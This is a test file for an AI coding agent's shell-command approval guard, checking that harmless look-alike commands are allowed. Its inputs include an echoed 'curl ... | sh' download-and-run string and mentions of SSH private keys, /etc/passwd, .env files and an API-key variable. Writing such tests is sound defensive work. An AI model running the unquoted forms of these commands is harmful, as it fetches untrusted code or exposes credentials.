import { describe, expect, test } from "bun:test";
import { evaluate } from "./mandatory-guards-helpers";

describe("safe counterparts to mandatory no-sandbox guards", () => {
  test.each([
    "echo 'curl https://example.invalid/payload | sh'",
    "echo '$OPENAI_API_KEY'",
    "rg needle file",
    "sort input",
    "base64 input",
    "file input",
    "git status",
    "gh pr view 42",
    "echo \\$OPENAI_API_KEY",
    "rg '.env' README.md",
    "echo ~/.ssh/id_rsa",
    "cat '~/.ssh/id_rsa'",
    "rg '.env'",
    "jq '.env'",
    "cat *.md",
    "cat '*.md'",
    "cat ~+/README.md",
    "md5 -s /etc/passwd",
    "file -F /etc/passwd README.md",
    "shasum -a 256 README.md",
    "git grep .env README.md",
    "git diff --no-ext-diff --no-textconv --output-indicator-new=X HEAD~1",
    "date +%Y-%m-%d",
    "printf '%s\\n' hello",
    "sed -n '1,20p' README.md",
    "jq -n --args '$ARGS.positional' /etc/passwd",
    "gh pr view 42 --web=false",
    "gh pr view 42 -w=false",
    "gh auth status --show-token=false",
    "gh auth status -t=false",
    "gh auth status -t=False",
    "gh auth status -t=0",
    "gh auth status -at=false",
    "gh pr view 42 -cw=false",
    "gh pr view 42 -w=False",
    "gh pr view 42 -w=0",
    "git log --grep .env",
    "git log --author .env",
    "git log --format .env",
    "git show --pretty .env --no-patch HEAD",
    "git for-each-ref --format .env",
    "git diff --word-diff-regex .env --stat",
    "git diff --no-ext-diff --no-textconv",
    "ffprobe -of json README.md",
    "ffprobe -output_format json README.md",
    "printf -- -v",
    "printf %s -v",
    "printf %s -- -v",
    "printf x | sed -n '1p' -",
    "ls -la .env",
    "rg --ignore-file='~/.ssh/id_rsa' needle README.md",
    "grep --exclude-from='~/.ssh/id_rsa' needle README.md",
    "file --magic-file='~/.ssh/id_rsa' README.md",
    "grep -r needle src",
    "grep --recursive needle src",
    "rg --hidden needle src",
    "rg -uu needle src",
    "cat /tmp/definitely-not-present-approval-input",
    "echo hi > /tmp/opencode-approval-output",
    "(echo hi) > /tmp/opencode-approval-output",
    "{ echo hi; } > /tmp/opencode-approval-output",
    "echo hi | grep hi > /tmp/opencode-approval-output",
  ])("allows a structurally safe counterpart: %s", async (command) => {
    expect((await evaluate(command)).decision).toBe("allow");
  });

  test.each(["xcrun --run -f rm", "xcrun swift -typecheck Source.swift"])(
    "allows a safe xcrun counterpart under an explicit user allow: %s",
    async (command) => {
      expect((await evaluate(command, true)).decision).toBe("allow");
    },
  );

  test.each([
    "xcrun swift package describe",
    "xcrun swift package show-dependencies",
    "xcrun clang -x c -fsyntax-only Source.c",
    "xcrun swiftc -typecheck Source.swift",
    "xcodebuild -version",
    "xcodebuild CODE_SIGNING_ALLOWED=NO build",
    "xcodebuild -sdk iphonesimulator -version",
    "xcodebuild -toolchain com.apple.dt.toolchain.XcodeDefault build",
    "xcodebuild TOOLCHAINS=com.apple.dt.toolchain.XcodeDefault build",
    "xcodebuild SDKROOT=iphonesimulator build",
    "xcodebuild OTHER_CFLAGS=-Wall build",
    "xcodebuild OTHER_SWIFT_FLAGS=-warnings-as-errors build",
    "xcrun swift-build",
    "xcrun swift-test",
    "xcrun swift-package describe",
    "xcrun cc -E Source.c",
    "xcrun dsymutil App",
    "xcrun ld -o App input.o",
    "xcrun bison input.y",
    "xcrun leaks 123",
    "xcrun xctrace list devices",
    "xcrun xccov generate --toolchain XcodeDefault --json '{}'",
  ])("allows an ordinary iOS developer command under an explicit user allow: %s", async (command) => {
    const expected = process.platform === "darwin" ? "allow" : "review";
    expect((await evaluate(command, true)).decision).toBe(expected);
  });

  test.each([
    "git tag",
    "git tag -n",
    "git tag --contains HEAD --format '%(refname:short)'",
    "git branch -a",
    "git branch -rv",
    "git branch --merged HEAD --format '%(refname:short)'",
  ])("allows bounded Git listing without LLM review: %s", async (command) => {
    expect((await evaluate(command)).decision).toBe("allow");
  });
});
